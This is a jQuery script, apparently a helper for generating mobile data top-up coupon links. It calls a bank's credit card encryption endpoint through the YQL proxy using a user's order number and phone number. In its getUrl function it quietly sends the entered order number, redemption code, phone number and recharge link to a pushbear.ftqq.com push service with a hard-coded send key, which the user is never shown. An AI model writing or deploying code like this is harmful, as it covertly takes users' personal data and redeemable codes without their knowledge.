var bannedKeys = ["aXJzdHRlc3Q="];
var myList = ["EO2017081603036229294", "EO2017082303036394733", "EO2017082303036392738", "EO2017082303036389694", "EO2017082303036385441", "EO2017082303036394725", "EO2017081603036224153", "EO2017082303036385674", "EO2017082303036389682", "EO2017082303036387686", "EO2017082303036386672", "EO2017081603036215080", "EO2017082303036383680", "EO2017082303036389676", "EO2017082303036388593", "EO2017082303036381621", "EO2017082303036384382", "EO2017082303036385669", "EO2017082303036385594","EO2017082303036383680", "EO2017082303036389676", "EO2017082303036384651", "EO2017082303036388588", "EO2017082303036381651", "EO2017082303036382715", "EO2017082303036384450", "EO2017071903035749466", "EO2017071903035725364", "EO2017082303036380491", "EO2017082303036389678", "EO2017081603036228284", "EO2017082303036386719", "EO2017082303036385674", "EO2017082303036389682", "EO2017082303036387686", "EO2017082303036386672", "EO2017081603036215080"];

var showIn = function(){
  $("#in").append("<input type=text class=form-control id=orderId placeholder=订单号> <input type=text class=form-control id=mobile placeholder=手机号> <input type=text class=form-control id=code placeholder=兑换码><textarea id=result class=form-control>");
  $("#yql").attr("onclick", "getEnc()");
}

var check = function() {
  if (bannedKeys.indexOf(uk) === -1) {
    return true;
  }else{
    alert("请用新版~");
    return false;
  }
}

var getEnc = function(orderId){
  var valid = check();
  if(valid){
    var mobile = $("#mobile").val();
    var orderId = $("#orderId").val();
    var u = 'https://prefacty.creditcard.cmbc.com.cn/mmc-main-webapp/main/TDESEncryptByCMBCC.json?paramMap={"orderId":"'+orderId+'","mobile":"'+mobile+'"}';
    $.ajax({
        url: "https://query.yahooapis.com/v1/public/yql",
        dataType: "json",
        timeout: 10000,
        data: {
            format: "json",
            q: $("#yql").data("ql") + encodeURI(u) + $("#yql").data("qr")
        },
        success: getUrl,
        error: function(c, u) {
            alert("错误 联系开发者");
        }
    });
  }
}

var getUrl = function(data){
  if(data.query){
    var re = data.query.results;
    if(re){
      var str = re.reply.enStr;
      var mobile = $("#mobile").val();
      var code = $("#code").val();
      var orderId = $("#orderId").val();
      var u = "http://ms.lefone.cn/msflowday/couponShowController/showCoupon.do?enStr=" + encodeURIComponent(str);
      var result = "订单：" + orderId + " 码：" + code + " 手机号：" + mobile + " 充值链接：" + u;
      var extra = " 2款" + orderId;
      if(myList.indexOf(orderId) > -1){
        extra = " 14款" + orderId;
      }
      $.get("https://pushbear.ftqq.com/sub?sendkey=751-9616f3ff7deb3cdfda6f4f547ab5b153&text=流量充值"+extra+"&desp=" + result)
      $("#result").text(result);
    }
  }
}
